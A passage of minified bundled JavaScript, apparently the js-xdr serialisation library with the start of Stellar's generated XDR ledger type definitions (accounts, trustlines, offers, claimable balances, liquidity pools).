            value: function(ye, be) {
                if (!(ye instanceof this))
                    throw new Error("XDR Write Error: " + ye + " is not a " + this.structName);
                (0,
                O.default)(this._fields, function(xe) {
                    var Ae = _(xe, 2)
                      , Ee = Ae[0]
                      , Be = Ae[1]
                      , ce = ye._attributes[Ee];
                    Be.write(ce, be)
                })
            }
        }, {
            key: "isValid",
            value: function(ye) {
                return ye instanceof this
            }
        }, {
            key: "create",
            value: function(ye, be, xe) {
                var Ae = function(Ee) {
                    ne(Be, Ee);
                    function Be() {
                        return oe(this, Be),
                        ae(this, (Be.__proto__ || Object.getPrototypeOf(Be)).apply(this, arguments))
                    }
                    return Be
                }(he);
                return Ae.structName = be,
                ye.results[be] = Ae,
                Ae._fields = xe.map(function(Ee) {
                    var Be = _(Ee, 2)
                      , ce = Be[0]
                      , q = Be[1];
                    return q instanceof V.Reference && (q = q.resolve(ye)),
                    [ce, q]
                }),
                (0,
                O.default)(Ae._fields, function(Ee) {
                    var Be = _(Ee, 1)
                      , ce = Be[0];
                    Ae.prototype[ce] = fe(ce)
                }),
                Ae
            }
        }]),
        he
    }();
    (0,
    Q.default)(ue);
    function fe(he) {
        return function(ye) {
            return (0,
            X.default)(ye) || (this._attributes[he] = ye),
            this._attributes[he]
        }
    }
    return struct
}
var union = {}, hasRequiredUnion;
function requireUnion() {
    if (hasRequiredUnion)
        return union;
    hasRequiredUnion = 1,
    Object.defineProperty(union, "__esModule", {
        value: !0
    }),
    union.Union = void 0;
    var _ = function() {
        function ue(fe, he) {
            var pe = []
              , ye = !0
              , be = !1
              , xe = void 0;
            try {
                for (var Ae = fe[Symbol.iterator](), Ee; !(ye = (Ee = Ae.next()).done) && (pe.push(Ee.value),
                !(he && pe.length === he)); ye = !0)
                    ;
            } catch (Be) {
                be = !0,
                xe = Be
            } finally {
                try {
                    !ye && Ae.return && Ae.return()
                } finally {
                    if (be)
                        throw xe
                }
            }
            return pe
        }
        return function(fe, he) {
            if (Array.isArray(fe))
                return fe;
            if (Symbol.iterator in Object(fe))
                return ue(fe, he);
            throw new TypeError("Invalid attempt to destructure non-iterable instance")
        }
    }()
      , M = function() {
        function ue(fe, he) {
            for (var pe = 0; pe < he.length; pe++) {
                var ye = he[pe];
                ye.enumerable = ye.enumerable || !1,
                ye.configurable = !0,
                "value"in ye && (ye.writable = !0),
                Object.defineProperty(fe, ye.key, ye)
            }
        }
        return function(fe, he, pe) {
            return he && ue(fe.prototype, he),
            pe && ue(fe, pe),
            fe
        }
    }()
      , j = requireEach()
      , O = Q(j)
      , x = requireIsUndefined()
      , w = Q(x)
      , b = requireIsString()
      , X = Q(b)
      , Y = require_void()
      , F = requireReference()
      , V = requireIoMixin()
      , K = Q(V);
    function Q(ue) {
        return ue && ue.__esModule ? ue : {
            default: ue
        }
    }
    function ee(ue, fe) {
        if (!ue)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return fe && (typeof fe == "object" || typeof fe == "function") ? fe : ue
    }
    function ae(ue, fe) {
        if (typeof fe != "function" && fe !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof fe);
        ue.prototype = Object.create(fe && fe.prototype, {
            constructor: {
                value: ue,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        fe && (Object.setPrototypeOf ? Object.setPrototypeOf(ue, fe) : ue.__proto__ = fe)
    }
    function ne(ue, fe) {
        if (!(ue instanceof fe))
            throw new TypeError("Cannot call a class as a function")
    }
    var oe = union.Union = function() {
        function ue(fe, he) {
            ne(this, ue),
            this.set(fe, he)
        }
        return M(ue, [{
            key: "set",
            value: function(he, pe) {
                (0,
                X.default)(he) && (he = this.constructor._switchOn.fromName(he)),
                this._switch = he,
                this._arm = this.constructor.armForSwitch(this._switch),
                this._armType = this.constructor.armTypeForArm(this._arm),
                this._value = pe
            }
        }, {
            key: "get",
            value: function() {
                var he = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : this._arm;
                if (this._arm !== Y.Void && this._arm !== he)
                    throw new Error(he + " not set");
                return this._value
            }
        }, {
            key: "switch",
            value: function() {
                return this._switch
            }
        }, {
            key: "arm",
            value: function() {
                return this._arm
            }
        }, {
            key: "armType",
            value: function() {
                return this._armType
            }
        }, {
            key: "value",
            value: function() {
                return this._value
            }
        }], [{
            key: "armForSwitch",
            value: function(he) {
                if (this._switches.has(he))
                    return this._switches.get(he);
                if (this._defaultArm)
                    return this._defaultArm;
                throw new Error("Bad union switch: " + he)
            }
        }, {
            key: "armTypeForArm",
            value: function(he) {
                return he === Y.Void ? Y.Void : this._arms[he]
            }
        }, {
            key: "read",
            value: function(he) {
                var pe = this._switchOn.read(he)
                  , ye = this.armForSwitch(pe)
                  , be = this.armTypeForArm(ye)
                  , xe = void 0;
                return (0,
                w.default)(be) ? xe = ye.read(he) : xe = be.read(he),
                new this(pe,xe)
            }
        }, {
            key: "write",
            value: function(he, pe) {
                if (!(he instanceof this))
                    throw new Error("XDR Write Error: " + he + " is not a " + this.unionName);
                this._switchOn.write(he.switch(), pe),
                he.armType().write(he.value(), pe)
            }
        }, {
            key: "isValid",
            value: function(he) {
                return he instanceof this
            }
        }, {
            key: "create",
            value: function(he, pe, ye) {
                var be = function(Ae) {
                    ae(Ee, Ae);
                    function Ee() {
                        return ne(this, Ee),
                        ee(this, (Ee.__proto__ || Object.getPrototypeOf(Ee)).apply(this, arguments))
                    }
                    return Ee
                }(ue);
                be.unionName = pe,
                he.results[pe] = be,
                ye.switchOn instanceof F.Reference ? be._switchOn = ye.switchOn.resolve(he) : be._switchOn = ye.switchOn,
                be._switches = new Map,
                be._arms = {},
                (0,
                O.default)(ye.arms, function(Ae, Ee) {
                    Ae instanceof F.Reference && (Ae = Ae.resolve(he)),
                    be._arms[Ee] = Ae
                });
                var xe = ye.defaultArm;
                return xe instanceof F.Reference && (xe = xe.resolve(he)),
                be._defaultArm = xe,
                (0,
                O.default)(ye.switches, function(Ae) {
                    var Ee = _(Ae, 2)
                      , Be = Ee[0]
                      , ce = Ee[1];
                    (0,
                    X.default)(Be) && (Be = be._switchOn.fromName(Be)),
                    be._switches.set(Be, ce)
                }),
                (0,
                w.default)(be._switchOn.values) || (0,
                O.default)(be._switchOn.values(), function(Ae) {
                    be[Ae.name] = function(Ee) {
                        return new be(Ae,Ee)
                    }
                    ,
                    be.prototype[Ae.name] = function(Be) {
                        return this.set(Ae, Be)
                    }
                }),
                (0,
                O.default)(be._arms, function(Ae, Ee) {
                    Ae !== Y.Void && (be.prototype[Ee] = function() {
                        return this.get(Ee)
                    }
                    )
                }),
                be
            }
        }]),
        ue
    }();
    return (0,
    K.default)(oe),
    union
}
var hasRequiredTypes;
function requireTypes() {
    return hasRequiredTypes || (hasRequiredTypes = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        });
        var M = requireInt();
        Object.keys(M).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return M[he]
                }
            })
        });
        var j = requireHyper();
        Object.keys(j).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return j[he]
                }
            })
        });
        var O = requireUnsignedInt();
        Object.keys(O).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return O[he]
                }
            })
        });
        var x = requireUnsignedHyper();
        Object.keys(x).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return x[he]
                }
            })
        });
        var w = requireFloat();
        Object.keys(w).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return w[he]
                }
            })
        });
        var b = requireDouble();
        Object.keys(b).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return b[he]
                }
            })
        });
        var X = requireQuadruple();
        Object.keys(X).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return X[he]
                }
            })
        });
        var Y = requireBool();
        Object.keys(Y).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return Y[he]
                }
            })
        });
        var F = requireString();
        Object.keys(F).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return F[he]
                }
            })
        });
        var V = requireOpaque();
        Object.keys(V).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return V[he]
                }
            })
        });
        var K = requireVarOpaque();
        Object.keys(K).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return K[he]
                }
            })
        });
        var Q = requireArray();
        Object.keys(Q).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return Q[he]
                }
            })
        });
        var ee = requireVarArray();
        Object.keys(ee).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return ee[he]
                }
            })
        });
        var ae = requireOption();
        Object.keys(ae).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return ae[he]
                }
            })
        });
        var ne = require_void();
        Object.keys(ne).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return ne[he]
                }
            })
        });
        var oe = require_enum();
        Object.keys(oe).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return oe[he]
                }
            })
        });
        var ue = requireStruct();
        Object.keys(ue).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return ue[he]
                }
            })
        });
        var fe = requireUnion();
        Object.keys(fe).forEach(function(he) {
            he === "default" || he === "__esModule" || Object.defineProperty(_, he, {
                enumerable: !0,
                get: function() {
                    return fe[he]
                }
            })
        })
    }(types)),
    types
}
var config$1 = {}, hasRequiredConfig$1;
function requireConfig$1() {
    return hasRequiredConfig$1 || (hasRequiredConfig$1 = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        });
        var M = function() {
            function xe(Ae, Ee) {
                for (var Be = 0; Be < Ee.length; Be++) {
                    var ce = Ee[Be];
                    ce.enumerable = ce.enumerable || !1,
                    ce.configurable = !0,
                    "value"in ce && (ce.writable = !0),
                    Object.defineProperty(Ae, ce.key, ce)
                }
            }
            return function(Ae, Ee, Be) {
                return Ee && xe(Ae.prototype, Ee),
                Be && xe(Ae, Be),
                Ae
            }
        }()
          , j = requireReference();
        Object.keys(j).forEach(function(xe) {
            xe === "default" || xe === "__esModule" || Object.defineProperty(_, xe, {
                enumerable: !0,
                get: function() {
                    return j[xe]
                }
            })
        }),
        _.config = ae;
        var O = requireIsUndefined()
          , x = V(O)
          , w = requireEach()
          , b = V(w)
          , X = requireTypes()
          , Y = F(X);
        function F(xe) {
            if (xe && xe.__esModule)
                return xe;
            var Ae = {};
            if (xe != null)
                for (var Ee in xe)
                    Object.prototype.hasOwnProperty.call(xe, Ee) && (Ae[Ee] = xe[Ee]);
            return Ae.default = xe,
            Ae
        }
        function V(xe) {
            return xe && xe.__esModule ? xe : {
                default: xe
            }
        }
        function K(xe, Ae) {
            if (!(xe instanceof Ae))
                throw new TypeError("Cannot call a class as a function")
        }
        function Q(xe, Ae) {
            if (!xe)
                throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return Ae && (typeof Ae == "object" || typeof Ae == "function") ? Ae : xe
        }
        function ee(xe, Ae) {
            if (typeof Ae != "function" && Ae !== null)
                throw new TypeError("Super expression must either be null or a function, not " + typeof Ae);
            xe.prototype = Object.create(Ae && Ae.prototype, {
                constructor: {
                    value: xe,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }),
            Ae && (Object.setPrototypeOf ? Object.setPrototypeOf(xe, Ae) : xe.__proto__ = Ae)
        }
        function ae(xe) {
            var Ae = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            if (xe) {
                var Ee = new be(Ae);
                xe(Ee),
                Ee.resolve()
            }
            return Ae
        }
        var ne = function(xe) {
            ee(Ae, xe);
            function Ae(Ee) {
                K(this, Ae);
                var Be = Q(this, (Ae.__proto__ || Object.getPrototypeOf(Ae)).call(this));
                return Be.name = Ee,
                Be
            }
            return M(Ae, [{
                key: "resolve",
                value: function(Be) {
                    var ce = Be.definitions[this.name];
                    return ce.resolve(Be)
                }
            }]),
            Ae
        }(j.Reference)
          , oe = function(xe) {
            ee(Ae, xe);
            function Ae(Ee, Be) {
                var ce = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : !1;
                K(this, Ae);
                var q = Q(this, (Ae.__proto__ || Object.getPrototypeOf(Ae)).call(this));
                return q.childReference = Ee,
                q.length = Be,
                q.variable = ce,
                q
            }
            return M(Ae, [{
                key: "resolve",
                value: function(Be) {
                    var ce = this.childReference
                      , q = this.length;
                    return ce instanceof j.Reference && (ce = ce.resolve(Be)),
                    q instanceof j.Reference && (q = q.resolve(Be)),
                    this.variable ? new Y.VarArray(ce,q) : new Y.Array(ce,q)
                }
            }]),
            Ae
        }(j.Reference)
          , ue = function(xe) {
            ee(Ae, xe);
            function Ae(Ee) {
                K(this, Ae);
                var Be = Q(this, (Ae.__proto__ || Object.getPrototypeOf(Ae)).call(this));
                return Be.childReference = Ee,
                Be.name = Ee.name,
                Be
            }
            return M(Ae, [{
                key: "resolve",
                value: function(Be) {
                    var ce = this.childReference;
                    return ce instanceof j.Reference && (ce = ce.resolve(Be)),
                    new Y.Option(ce)
                }
            }]),
            Ae
        }(j.Reference)
          , fe = function(xe) {
            ee(Ae, xe);
            function Ae(Ee, Be) {
                K(this, Ae);
                var ce = Q(this, (Ae.__proto__ || Object.getPrototypeOf(Ae)).call(this));
                return ce.sizedType = Ee,
                ce.length = Be,
                ce
            }
            return M(Ae, [{
                key: "resolve",
                value: function(Be) {
                    var ce = this.length;
                    return ce instanceof j.Reference && (ce = ce.resolve(Be)),
                    new this.sizedType(ce)
                }
            }]),
            Ae
        }(j.Reference)
          , he = function() {
            function xe(Ae, Ee, Be) {
                K(this, xe),
                this.constructor = Ae,
                this.name = Ee,
                this.config = Be
            }
            return M(xe, [{
                key: "resolve",
                value: function(Ee) {
                    return this.name in Ee.results ? Ee.results[this.name] : this.constructor(Ee, this.name, this.config)
                }
            }]),
            xe
        }();
        function pe(xe, Ae, Ee) {
            return Ee instanceof j.Reference && (Ee = Ee.resolve(xe)),
            xe.results[Ae] = Ee,
            Ee
        }
        function ye(xe, Ae, Ee) {
            return xe.results[Ae] = Ee,
            Ee
        }
        var be = function() {
            function xe(Ae) {
                K(this, xe),
                this._destination = Ae,
                this._definitions = {}
            }
            return M(xe, [{
                key: "enum",
                value: function(Ee, Be) {
                    var ce = new he(Y.Enum.create,Ee,Be);
                    this.define(Ee, ce)
                }
            }, {
                key: "struct",
                value: function(Ee, Be) {
                    var ce = new he(Y.Struct.create,Ee,Be);
                    this.define(Ee, ce)
                }
            }, {
                key: "union",
                value: function(Ee, Be) {
                    var ce = new he(Y.Union.create,Ee,Be);
                    this.define(Ee, ce)
                }
            }, {
                key: "typedef",
                value: function(Ee, Be) {
                    var ce = new he(pe,Ee,Be);
                    this.define(Ee, ce)
                }
            }, {
                key: "const",
                value: function(Ee, Be) {
                    var ce = new he(ye,Ee,Be);
                    this.define(Ee, ce)
                }
            }, {
                key: "void",
                value: function() {
                    return Y.Void
                }
            }, {
                key: "bool",
                value: function() {
                    return Y.Bool
                }
            }, {
                key: "int",
                value: function() {
                    return Y.Int
                }
            }, {
                key: "hyper",
                value: function() {
                    return Y.Hyper
                }
            }, {
                key: "uint",
                value: function() {
                    return Y.UnsignedInt
                }
            }, {
                key: "uhyper",
                value: function() {
                    return Y.UnsignedHyper
                }
            }, {
                key: "float",
                value: function() {
                    return Y.Float
                }
            }, {
                key: "double",
                value: function() {
                    return Y.Double
                }
            }, {
                key: "quadruple",
                value: function() {
                    return Y.Quadruple
                }
            }, {
                key: "string",
                value: function(Ee) {
                    return new fe(Y.String,Ee)
                }
            }, {
                key: "opaque",
                value: function(Ee) {
                    return new fe(Y.Opaque,Ee)
                }
            }, {
                key: "varOpaque",
                value: function(Ee) {
                    return new fe(Y.VarOpaque,Ee)
                }
            }, {
                key: "array",
                value: function(Ee, Be) {
                    return new oe(Ee,Be)
                }
            }, {
                key: "varArray",
                value: function(Ee, Be) {
                    return new oe(Ee,Be,!0)
                }
            }, {
                key: "option",
                value: function(Ee) {
                    return new ue(Ee)
                }
            }, {
                key: "define",
                value: function(Ee, Be) {
                    if ((0,
                    x.default)(this._destination[Ee]))
                        this._definitions[Ee] = Be;
                    else
                        throw new Error("XDRTypes Error:" + Ee + " is already defined")
                }
            }, {
                key: "lookup",
                value: function(Ee) {
                    return new ne(Ee)
                }
            }, {
                key: "resolve",
                value: function() {
                    var Ee = this;
                    (0,
                    b.default)(this._definitions, function(Be) {
                        Be.resolve({
                            definitions: Ee._definitions,
                            results: Ee._destination
                        })
                    })
                }
            }]),
            xe
        }()
    }(config$1)),
    config$1
}
var hasRequiredLib$4;
function requireLib$4() {
    return hasRequiredLib$4 || (hasRequiredLib$4 = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        });
        var M = requireTypes();
        Object.keys(M).forEach(function(O) {
            O === "default" || O === "__esModule" || Object.defineProperty(_, O, {
                enumerable: !0,
                get: function() {
                    return M[O]
                }
            })
        });
        var j = requireConfig$1();
        Object.keys(j).forEach(function(O) {
            O === "default" || O === "__esModule" || Object.defineProperty(_, O, {
                enumerable: !0,
                get: function() {
                    return j[O]
                }
            })
        })
    }(lib$2)),
    lib$2
}
var hasRequiredStellarXdr_generated;
function requireStellarXdr_generated() {
    if (hasRequiredStellarXdr_generated)
        return stellarXdr_generated;
    hasRequiredStellarXdr_generated = 1,
    Object.defineProperty(stellarXdr_generated, "__esModule", {
        value: !0
    });
    var _ = requireLib$4()
      , M = j(_);
    function j(x) {
        if (x && x.__esModule)
            return x;
        var w = {};
        if (x != null)
            for (var b in x)
                Object.prototype.hasOwnProperty.call(x, b) && (w[b] = x[b]);
        return w.default = x,
        w
    }
    var O = M.config(function(x) {
        x.typedef("AccountId", x.lookup("PublicKey")),
        x.typedef("Thresholds", x.opaque(4)),
        x.typedef("String32", x.string(32)),
        x.typedef("String64", x.string(64)),
        x.typedef("SequenceNumber", x.lookup("Int64")),
        x.typedef("TimePoint", x.lookup("Uint64")),
        x.typedef("DataValue", x.varOpaque(64)),
        x.typedef("PoolId", x.lookup("Hash")),
        x.typedef("AssetCode4", x.opaque(4)),
        x.typedef("AssetCode12", x.opaque(12)),
        x.enum("AssetType", {
            assetTypeNative: 0,
            assetTypeCreditAlphanum4: 1,
            assetTypeCreditAlphanum12: 2,
            assetTypePoolShare: 3
        }),
        x.union("AssetCode", {
            switchOn: x.lookup("AssetType"),
            switchName: "type",
            switches: [["assetTypeCreditAlphanum4", "assetCode4"], ["assetTypeCreditAlphanum12", "assetCode12"]],
            arms: {
                assetCode4: x.lookup("AssetCode4"),
                assetCode12: x.lookup("AssetCode12")
            }
        }),
        x.struct("AlphaNum4", [["assetCode", x.lookup("AssetCode4")], ["issuer", x.lookup("AccountId")]]),
        x.struct("AlphaNum12", [["assetCode", x.lookup("AssetCode12")], ["issuer", x.lookup("AccountId")]]),
        x.union("Asset", {
            switchOn: x.lookup("AssetType"),
            switchName: "type",
            switches: [["assetTypeNative", x.void()], ["assetTypeCreditAlphanum4", "alphaNum4"], ["assetTypeCreditAlphanum12", "alphaNum12"]],
            arms: {
                alphaNum4: x.lookup("AlphaNum4"),
                alphaNum12: x.lookup("AlphaNum12")
            }
        }),
        x.struct("Price", [["n", x.lookup("Int32")], ["d", x.lookup("Int32")]]),
        x.struct("Liabilities", [["buying", x.lookup("Int64")], ["selling", x.lookup("Int64")]]),
        x.enum("ThresholdIndices", {
            thresholdMasterWeight: 0,
            thresholdLow: 1,
            thresholdMed: 2,
            thresholdHigh: 3
        }),
        x.enum("LedgerEntryType", {
            account: 0,
            trustline: 1,
            offer: 2,
            data: 3,
            claimableBalance: 4,
            liquidityPool: 5
        }),
        x.struct("Signer", [["key", x.lookup("SignerKey")], ["weight", x.lookup("Uint32")]]),
        x.enum("AccountFlags", {
            authRequiredFlag: 1,
            authRevocableFlag: 2,
            authImmutableFlag: 4,
            authClawbackEnabledFlag: 8
        }),
        x.const("MASK_ACCOUNT_FLAGS", 7),
        x.const("MASK_ACCOUNT_FLAGS_V17", 15),
        x.const("MAX_SIGNERS", 20),
        x.typedef("SponsorshipDescriptor", x.option(x.lookup("AccountId"))),
        x.union("AccountEntryExtensionV2Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("AccountEntryExtensionV2", [["numSponsored", x.lookup("Uint32")], ["numSponsoring", x.lookup("Uint32")], ["signerSponsoringIDs", x.varArray(x.lookup("SponsorshipDescriptor"), x.lookup("MAX_SIGNERS"))], ["ext", x.lookup("AccountEntryExtensionV2Ext")]]),
        x.union("AccountEntryExtensionV1Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [2, "v2"]],
            arms: {
                v2: x.lookup("AccountEntryExtensionV2")
            }
        }),
        x.struct("AccountEntryExtensionV1", [["liabilities", x.lookup("Liabilities")], ["ext", x.lookup("AccountEntryExtensionV1Ext")]]),
        x.union("AccountEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [1, "v1"]],
            arms: {
                v1: x.lookup("AccountEntryExtensionV1")
            }
        }),
        x.struct("AccountEntry", [["accountId", x.lookup("AccountId")], ["balance", x.lookup("Int64")], ["seqNum", x.lookup("SequenceNumber")], ["numSubEntries", x.lookup("Uint32")], ["inflationDest", x.option(x.lookup("AccountId"))], ["flags", x.lookup("Uint32")], ["homeDomain", x.lookup("String32")], ["thresholds", x.lookup("Thresholds")], ["signers", x.varArray(x.lookup("Signer"), x.lookup("MAX_SIGNERS"))], ["ext", x.lookup("AccountEntryExt")]]),
        x.enum("TrustLineFlags", {
            authorizedFlag: 1,
            authorizedToMaintainLiabilitiesFlag: 2,
            trustlineClawbackEnabledFlag: 4
        }),
        x.const("MASK_TRUSTLINE_FLAGS", 1),
        x.const("MASK_TRUSTLINE_FLAGS_V13", 3),
        x.const("MASK_TRUSTLINE_FLAGS_V17", 7),
        x.enum("LiquidityPoolType", {
            liquidityPoolConstantProduct: 0
        }),
        x.union("TrustLineAsset", {
            switchOn: x.lookup("AssetType"),
            switchName: "type",
            switches: [["assetTypeNative", x.void()], ["assetTypeCreditAlphanum4", "alphaNum4"], ["assetTypeCreditAlphanum12", "alphaNum12"], ["assetTypePoolShare", "liquidityPoolId"]],
            arms: {
                alphaNum4: x.lookup("AlphaNum4"),
                alphaNum12: x.lookup("AlphaNum12"),
                liquidityPoolId: x.lookup("PoolId")
            }
        }),
        x.union("TrustLineEntryExtensionV2Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("TrustLineEntryExtensionV2", [["liquidityPoolUseCount", x.lookup("Int32")], ["ext", x.lookup("TrustLineEntryExtensionV2Ext")]]),
        x.union("TrustLineEntryV1Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [2, "v2"]],
            arms: {
                v2: x.lookup("TrustLineEntryExtensionV2")
            }
        }),
        x.struct("TrustLineEntryV1", [["liabilities", x.lookup("Liabilities")], ["ext", x.lookup("TrustLineEntryV1Ext")]]),
        x.union("TrustLineEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [1, "v1"]],
            arms: {
                v1: x.lookup("TrustLineEntryV1")
            }
        }),
        x.struct("TrustLineEntry", [["accountId", x.lookup("AccountId")], ["asset", x.lookup("TrustLineAsset")], ["balance", x.lookup("Int64")], ["limit", x.lookup("Int64")], ["flags", x.lookup("Uint32")], ["ext", x.lookup("TrustLineEntryExt")]]),
        x.enum("OfferEntryFlags", {
            passiveFlag: 1
        }),
        x.const("MASK_OFFERENTRY_FLAGS", 1),
        x.union("OfferEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("OfferEntry", [["sellerId", x.lookup("AccountId")], ["offerId", x.lookup("Int64")], ["selling", x.lookup("Asset")], ["buying", x.lookup("Asset")], ["amount", x.lookup("Int64")], ["price", x.lookup("Price")], ["flags", x.lookup("Uint32")], ["ext", x.lookup("OfferEntryExt")]]),
        x.union("DataEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("DataEntry", [["accountId", x.lookup("AccountId")], ["dataName", x.lookup("String64")], ["dataValue", x.lookup("DataValue")], ["ext", x.lookup("DataEntryExt")]]),
        x.enum("ClaimPredicateType", {
            claimPredicateUnconditional: 0,
            claimPredicateAnd: 1,
            claimPredicateOr: 2,
            claimPredicateNot: 3,
            claimPredicateBeforeAbsoluteTime: 4,
            claimPredicateBeforeRelativeTime: 5
        }),
        x.union("ClaimPredicate", {
            switchOn: x.lookup("ClaimPredicateType"),
            switchName: "type",
            switches: [["claimPredicateUnconditional", x.void()], ["claimPredicateAnd", "andPredicates"], ["claimPredicateOr", "orPredicates"], ["claimPredicateNot", "notPredicate"], ["claimPredicateBeforeAbsoluteTime", "absBefore"], ["claimPredicateBeforeRelativeTime", "relBefore"]],
            arms: {
                andPredicates: x.varArray(x.lookup("ClaimPredicate"), 2),
                orPredicates: x.varArray(x.lookup("ClaimPredicate"), 2),
                notPredicate: x.option(x.lookup("ClaimPredicate")),
                absBefore: x.lookup("Int64"),
                relBefore: x.lookup("Int64")
            }
        }),
        x.enum("ClaimantType", {
            claimantTypeV0: 0
        }),
        x.struct("ClaimantV0", [["destination", x.lookup("AccountId")], ["predicate", x.lookup("ClaimPredicate")]]),
        x.union("Claimant", {
            switchOn: x.lookup("ClaimantType"),
            switchName: "type",
            switches: [["claimantTypeV0", "v0"]],
            arms: {
                v0: x.lookup("ClaimantV0")
            }
        }),
        x.enum("ClaimableBalanceIdType", {
            claimableBalanceIdTypeV0: 0,
            claimableBalanceIdTypeFromPoolRevoke: 1
        }),
        x.union("ClaimableBalanceId", {
            switchOn: x.lookup("ClaimableBalanceIdType"),
            switchName: "type",
            switches: [["claimableBalanceIdTypeV0", "v0"], ["claimableBalanceIdTypeFromPoolRevoke", "fromPoolRevoke"]],
            arms: {
                v0: x.lookup("Hash"),
                fromPoolRevoke: x.lookup("Hash")
            }
        }),
        x.enum("ClaimableBalanceFlags", {
            claimableBalanceClawbackEnabledFlag: 1
        }),
        x.const("MASK_CLAIMABLE_BALANCE_FLAGS", 1),
        x.union("ClaimableBalanceEntryExtensionV1Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("ClaimableBalanceEntryExtensionV1", [["ext", x.lookup("ClaimableBalanceEntryExtensionV1Ext")], ["flags", x.lookup("Uint32")]]),
        x.union("ClaimableBalanceEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [1, "v1"]],
            arms: {
                v1: x.lookup("ClaimableBalanceEntryExtensionV1")
            }
        }),
        x.struct("ClaimableBalanceEntry", [["balanceId", x.lookup("ClaimableBalanceId")], ["claimants", x.varArray(x.lookup("Claimant"), 10)], ["asset", x.lookup("Asset")], ["amount", x.lookup("Int64")], ["ext", x.lookup("ClaimableBalanceEntryExt")]]),
        x.struct("LiquidityPoolConstantProductParameters", [["assetA", x.lookup("Asset")], ["assetB", x.lookup("Asset")], ["fee", x.lookup("Int32")]]),
        x.struct("LiquidityPoolEntryConstantProduct", [["params", x.lookup("LiquidityPoolConstantProductParameters")], ["reserveA", x.lookup("Int64")], ["reserveB", x.lookup("Int64")], ["totalPoolShares", x.lookup("Int64")], ["poolSharesTrustLineCount", x.lookup("Int64")]]),
        x.union("LiquidityPoolEntryBody", {
            switchOn: x.lookup("LiquidityPoolType"),
            switchName: "type",
            switches: [["liquidityPoolConstantProduct", "constantProduct"]],
            arms: {
                constantProduct: x.lookup("LiquidityPoolEntryConstantProduct")
            }
        }),
        x.struct("LiquidityPoolEntry", [["liquidityPoolId", x.lookup("PoolId")], ["body", x.lookup("LiquidityPoolEntryBody")]]),
        x.union("LedgerEntryExtensionV1Ext", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()]],
            arms: {}
        }),
        x.struct("LedgerEntryExtensionV1", [["sponsoringId", x.lookup("SponsorshipDescriptor")], ["ext", x.lookup("LedgerEntryExtensionV1Ext")]]),
        x.union("LedgerEntryData", {
            switchOn: x.lookup("LedgerEntryType"),
            switchName: "type",
            switches: [["account", "account"], ["trustline", "trustLine"], ["offer", "offer"], ["data", "data"], ["claimableBalance", "claimableBalance"], ["liquidityPool", "liquidityPool"]],
            arms: {
                account: x.lookup("AccountEntry"),
                trustLine: x.lookup("TrustLineEntry"),
                offer: x.lookup("OfferEntry"),
                data: x.lookup("DataEntry"),
                claimableBalance: x.lookup("ClaimableBalanceEntry"),
                liquidityPool: x.lookup("LiquidityPoolEntry")
            }
        }),
        x.union("LedgerEntryExt", {
            switchOn: x.int(),
            switchName: "v",
            switches: [[0, x.void()], [1, "v1"]],
            arms: {
